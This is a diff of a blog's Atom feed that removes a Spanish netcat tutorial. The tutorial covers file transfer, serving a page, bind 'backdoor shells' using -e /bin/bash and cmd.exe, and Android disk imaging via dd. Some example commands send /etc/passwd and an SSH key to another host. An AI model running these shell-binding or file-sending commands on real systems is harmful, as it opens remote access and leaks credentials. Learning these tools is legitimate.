-	-i secs			delay interval for lines sent, ports scanned
-        -k                      set keepalive option on socket
-	-l			listen mode, for inbound connects
-	-n			numeric-only IP addresses, no DNS
-	-o file			hex dump of traffic
-	-p port			local port number
-	-r			randomize local and remote ports
-	-q secs			quit after EOF on stdin and delay of secs
-	-s addr			local source address
-	-T tos			set Type Of Service
-	-t			answer TELNET negotiation
-	-u			UDP mode
-	-v			verbose [use twice to be more verbose]
-	-w secs			timeout for connects and final net reads
-	-C			Send CRLF as line-ending
-	-z			zero-I/O mode [used for scanning]
-port numbers can be individual or ranges: lo-hi [inclusive];
-hyphens in port names must be backslash escaped (e.g. '&lt;/span&gt;ftp&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;data&lt;span class=&quot;s1&quot;&gt;').
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Con las opciones mínimas, &lt;code class=&quot;highlighter-rouge&quot;&gt;netcat&lt;/code&gt; abrirá una conexión TCP (UDP si se utiliza la opción &lt;code class=&quot;highlighter-rouge&quot;&gt;-u&lt;/code&gt;) al host y puerto indicado. Tened en cuenta que, en general, &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; y &lt;code class=&quot;highlighter-rouge&quot;&gt;netcat&lt;/code&gt; son alias del mismo comando (vamos, que se puede usar uno u otro indistintamente).&lt;/p&gt;
-
-&lt;h2 id=&quot;comunicación-a-través-de-netcat&quot;&gt;Comunicación a través de netcat&lt;/h2&gt;
-
-&lt;p&gt;Uno de los usos más habituales es el establecimiento de conexiones entre dos sistemas -dos &lt;em&gt;netcats&lt;/em&gt;- en modo cliente-servidor. Para ello, tenemos que hacer escuchar a una máquina (opción -l) en el puerto pertinente mientras enviamos datos desde la otra.&lt;/p&gt;
-
-&lt;p&gt;Por ejemplo, nos ponemos a escuchar en el puerto 8090…&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@rxhost-a# &lt;/span&gt;netcat -l -p 8090
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;…y transmitimos desde otro sistema a ese puerto:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@txhost-b# &lt;/span&gt;nc rxhost-a 8090
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Si ahora escribimos algo en la consola de txhost-a, aparecerá en la de rxhost-b. Muy bien, pero la gracia está en que esto permite enviar ficheros. Por ejemplo, supongamos que queremos transferir el contenido de un fichero arbitrario desde txhost-b a rxhost-a. Pues haremos lo siguiente en el host donde lo vamos a recibir:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@rxhost-a# &lt;/span&gt;netcat -l -p 8090 &amp;gt; recibido.txt
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;y lo transmitimos:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@txhost-b# netcat rxhost-a 8090 &amp;lt; /etc/passwd
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Utilizando &lt;em&gt;pipes&lt;/em&gt; podremos hacer cosas interesantes, como enviar ficheros o directorios completos en un &lt;em&gt;tarball&lt;/em&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@rxhost-a# &lt;/span&gt;netcat -l -p 8090 | tar zxvf -
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@txhost-b# &lt;/span&gt;tar -czf - &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; | netcat rxhost-a 8090
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Otra forma es utilizando &lt;code class=&quot;highlighter-rouge&quot;&gt;dd&lt;/code&gt;, que permite enviar no ya ficheros, sino dispositivos de bloque enteros. Por ejemplo, una adquisición forense de un disco, un backup bit a bit…&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@rxhost-a# &lt;/span&gt;netcat -l -p 8090 &amp;gt;id_rsa.pub
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@txhost-b# dd &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;.ssh/id_rsa.pub | nc rxhost-a 8090
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Se puede servir un fichero vía “web”:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@hosta:~# &lt;/span&gt;nc -l -p 80 &amp;lt;index.html
-GET / HTTP/1.1
-Host: 192.168.56.100
-User-Agent: curl/7.49.1
-Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Y, en el otro extemo recibirlo:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@hostb:~$ curl 192.168.56.100:80
-&amp;lt;h1&amp;gt;Hola, mundo!&amp;lt;/h1&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Otro clásico: &lt;em&gt;backdoor shells&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@host-a:~$ &lt;/span&gt;nc -l -p 8090 -e /bin/bash
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;¡También en Windows!&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c:\&amp;gt; &lt;/span&gt;nc -l -p 8090 -e cmd.exe
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;En el sistema remoto:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@host-a:~$ &lt;/span&gt;nc host-a -p 8090
-hostname
-host-b
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Más adelante añadiré otro post con cosas sobre shells inversas…&lt;/p&gt;
-
-&lt;p&gt;Un poquito más complejo: extracción del disco completo de un dispositivo Android. Partimos de un dispositivo &lt;em&gt;rooteado&lt;/em&gt; (necesitaremos acceder al disco en modo bloque con &lt;code class=&quot;highlighter-rouge&quot;&gt;dd&lt;/code&gt;) y conectado vía USB con &lt;code class=&quot;highlighter-rouge&quot;&gt;adb&lt;/code&gt;. El dispositivo móvil tiene &lt;code class=&quot;highlighter-rouge&quot;&gt;busybox&lt;/code&gt; instalado.&lt;/p&gt;
-
-&lt;p&gt;Primero, haremos forward de un socket mediante adb usando un puerto arbitrario:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;santoku@santoku:~$ &lt;/span&gt;adb forward tcp:8888 tcp:8888
-&lt;span class=&quot;gp&quot;&gt;santoku@santoku:~$ &lt;/span&gt;nc 127.0.0.1 8888 &amp;gt; dd.img
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;En el dispositivo (vía shell):&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;santoku@santoku:~$ &lt;/span&gt;adb shell
-shell@android:/ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su
-shell@android:/ &lt;span class=&quot;c&quot;&gt;# dd if=/dev/block/mmcblk0 | busybox nc -l -p 8888&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Y a esperar que se transfiera…&lt;/p&gt;</content><category term="netcat" /><category term="nc" /><summary type="html">Uso básico de netcat</summary></entry></feed>
+&lt;/div&gt;</content><category term="google" /><category term="chrome" /><category term="print" /><summary type="html">Arrancar Google Chrome en Xvfb</summary></entry></feed>
